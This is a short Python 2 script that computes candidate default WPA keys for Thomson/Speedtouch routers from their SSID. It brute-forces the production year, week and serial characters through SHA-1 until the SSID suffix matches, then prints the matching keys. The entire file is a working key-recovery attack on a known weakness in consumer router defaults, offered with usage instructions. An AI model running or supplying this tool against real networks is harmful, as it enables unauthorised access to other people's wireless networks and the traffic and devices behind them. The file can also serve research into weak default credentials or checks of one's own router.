#!/usr/bin/env python
#based on: http://hakim.ws/st585/KevinDevine/

__author__ = 'Renato S. Martins <smartins.renato@gmail.com>'

import sys
import hashlib
from base64 import b16encode
from datetime import datetime

# the alphanumeric array to loop through
alpha = ['0','1','2','3','4','5','6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']

possible_keys = []


def report_matches():
  '''prints how many matches were found'''
  matches = str(len(possible_keys)) + ' match'
  if len(possible_keys) != 1:
    matches += 'es'

  print
  print matches


def get_ssid_and_key(year, week, x1, x2, x3):
  '''given a year, a week and 3 hexadecimals returns the ssid and the SHA-1 key'''
  cp = 'CP' + str(year)[-2:] + ('%02d' % week) + b16encode(x1 + x2 + x3)
  sha1 = hashlib.sha1(cp).hexdigest()
  ssid = sha1[-6:].upper()
  key = sha1[:10].upper()
  return (ssid, key)


def get_args():
  '''gather arguments or set default values and show usage instructions'''
  args = sys.argv[1:]

  if not args:
    print '  Calculates the default WPA key of a Thomson/Speedtouch router'
    print '  Usage: %s SSID [INITIAL_YEAR=2008] [FINAL_YEAR=current]' % __file__
    print '  INITIAL_YEAR and FINAL_YEAR are possible years of production of the router needed to test keys'
    sys.exit()

  router_ssid = args[0][-6:].upper()

  if len(args) > 1:
    initial_year = int(args[1])
  else:
    initial_year = 2008
  if len(args) > 2:
    final_year = int(args[2])
  else:
    final_year = datetime.now().year

  return (router_ssid, initial_year, final_year)


def main():
  router_ssid, initial_year, final_year = get_args()

  print 'Generating keys for %s' % router_ssid
  print 'Hit Ctrl+C to interrupt'

  for y in range(initial_year,final_year+1):
    print 'Testing for year %d' % y
    for w in range(1, 53):
      for x1 in alpha:
        for x2 in alpha:
          for x3 in alpha:
            (ssid, key) = get_ssid_and_key(y, w, x1, x2, x3)
            if ssid == router_ssid:
              possible_keys.append(key)
              print '  %d/%d (%s%s%s)' % (y, w, x1, x2, x3) + ': ' + key


try:
  main()
except KeyboardInterrupt:
  pass
report_matches()

